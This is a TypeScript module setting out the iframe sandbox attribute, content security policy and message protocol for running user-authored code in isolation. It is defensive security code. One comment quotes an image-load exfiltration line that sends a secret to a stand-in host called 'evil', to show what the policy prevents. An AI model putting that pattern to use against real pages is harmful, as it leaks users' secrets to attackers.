/**
 * The contract between the host page and the frame that executes an authored code view.
 *
 * One module, two consumers — the web app that serves and embeds the frame, and the API that stamps
 * the frame's response header — so the policy and the embed cannot drift apart.
 * See docs/architecture/adr-031-sandboxed-surface-code.md.
 */

/** The static shell, served by the web app from its own origin. */
export const SURFACE_SANDBOX_PATH = "/surface-sandbox/";

export const SURFACE_SANDBOX_FRAME_SRC = `${SURFACE_SANDBOX_PATH}frame.html`;

/**
 * The frame's sandbox grant, in full.
 *
 * `allow-same-origin` is absent, and that absence is the entire security boundary: without it the
 * document lands in an opaque origin with no access to the host DOM, the session cookie, or storage.
 * `allow-popups`, `allow-modals`, `allow-forms` and `allow-top-navigation` are absent so authored
 * code cannot open a window, raise a dialog, or navigate away while impersonating the app.
 */
export const SURFACE_SANDBOX_ATTRIBUTE = "allow-scripts";

/**
 * The frame's own policy. No host source appears in it, so it is identical in dev, in the single
 * image, and behind an operator's reverse proxy — an absolute origin is not available to a static
 * file, and `'self'` matches nothing under an opaque origin.
 *
 * `connect-src 'none'` with `img-src data:` is what actually prevents exfiltration, including
 * `new Image().src = "https://evil/?" + secret`. `'unsafe-eval'` is required because the runtime
 * evaluates the authored module; inside a document that can reach nothing, it grants nothing.
 */
export const SURFACE_SANDBOX_CSP = [
  "default-src 'none'",
  "script-src 'unsafe-inline' 'unsafe-eval'",
  "style-src 'unsafe-inline'",
  "img-src data:",
  "font-src data:",
  "connect-src 'none'",
  "form-action 'none'",
  "base-uri 'none'",
  "frame-ancestors 'self'",
].join("; ");

/** Height bounds, in CSS pixels: an unclamped frame could fill the viewport and imitate the app. */
export const SURFACE_SANDBOX_MIN_HEIGHT = 64;
export const SURFACE_SANDBOX_MAX_HEIGHT = 640;

/** What the server sends for a code-backed component: the compiled module, never its source. */
export interface SurfaceCodeViewPayload {
  readonly compiled: string;
}

export interface SurfaceSandboxRenderMessage {
  readonly v: 1;
  readonly type: "tulip.render";
  readonly module: string;
  readonly props: Readonly<Record<string, unknown>>;
}

export type SurfaceSandboxOutboundMessage =
  | { readonly v: 1; readonly type: "tulip.ready" }
  | { readonly v: 1; readonly type: "tulip.height"; readonly px: number }
  | {
      readonly v: 1;
      readonly type: "tulip.emit";
      readonly action: unknown;
      readonly input: Readonly<Record<string, unknown>>;
    }
  | { readonly v: 1; readonly type: "tulip.error"; readonly message: string };
